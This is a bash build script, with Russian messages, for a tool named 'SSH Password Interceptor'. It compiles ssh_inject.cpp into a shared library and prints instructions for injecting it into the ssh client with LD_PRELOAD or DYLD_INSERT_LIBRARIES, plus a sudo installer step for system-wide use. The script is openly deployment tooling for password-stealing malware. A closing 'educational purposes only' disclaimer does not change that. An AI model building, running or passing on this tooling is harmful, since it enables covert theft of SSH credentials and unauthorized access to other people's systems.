#!/bin/bash

# SSH Password Interceptor - Скрипт компиляции
# Версия 1.1.0

echo "====================================="
echo "   SSH Password Interceptor v1.1.0"
echo "           Компиляция"
echo "====================================="
echo ""

# Проверка наличия необходимых файлов
if [ ! -f "state.hpp" ] || [ ! -f "ssh_inject.cpp" ]; then
    echo "Ошибка: не найдены исходные файлы (state.hpp, ssh_inject.cpp)."
    echo "Убедитесь, что вы запускаете скрипт из директории с исходными файлами."
    exit 1
fi

# Проверка наличия компилятора
if ! command -v g++ &> /dev/null; then
    echo "Ошибка: компилятор g++ не найден. Установите его с помощью:"
    echo "sudo apt install g++ (для Debian/Ubuntu)"
    echo "sudo yum install gcc-c++ (для CentOS/RHEL)"
    exit 1
fi

# Определение операционной системы
OS=$(uname -s)
echo "Обнаружена операционная система: $OS"

# Компиляция в зависимости от ОС
if [ "$OS" = "Linux" ]; then
    echo "Компиляция для Linux..."
    g++ -Wall -fPIC -shared -ldl -o libssh_inject.so ssh_inject.cpp
elif [ "$OS" = "Darwin" ]; then
    echo "Компиляция для macOS..."
    g++ -Wall -fPIC -shared -ldl -o libssh_inject.dylib ssh_inject.cpp
else
    echo "Предупреждение: неизвестная операционная система. Попытка компиляции для Linux..."
    g++ -Wall -fPIC -shared -ldl -o libssh_inject.so ssh_inject.cpp
fi

# Проверка успешной компиляции
if [ "$OS" = "Darwin" ] && [ -f "libssh_inject.dylib" ]; then
    echo "Компиляция завершена успешно. Создан файл libssh_inject.dylib"
    echo ""
    echo "Для использования выполните команду:"
    echo "DYLD_INSERT_LIBRARIES=./libssh_inject.dylib ssh user@host"
elif [ -f "libssh_inject.so" ]; then
    echo "Компиляция завершена успешно. Создан файл libssh_inject.so"
    echo ""
    echo "Для локального использования выполните команду:"
    echo "LD_PRELOAD=./libssh_inject.so ssh user@host"
    echo ""
    echo "Для установки в систему выполните:"
    echo "sudo ./installer.sh"
else
    echo "Ошибка при компиляции. Проверьте сообщения об ошибках выше."
    exit 1
fi

echo ""
echo "ПРЕДУПРЕЖДЕНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей."
echo "Использование этого инструмента для несанкционированного доступа к системам"
echo "является незаконным и неэтичным." 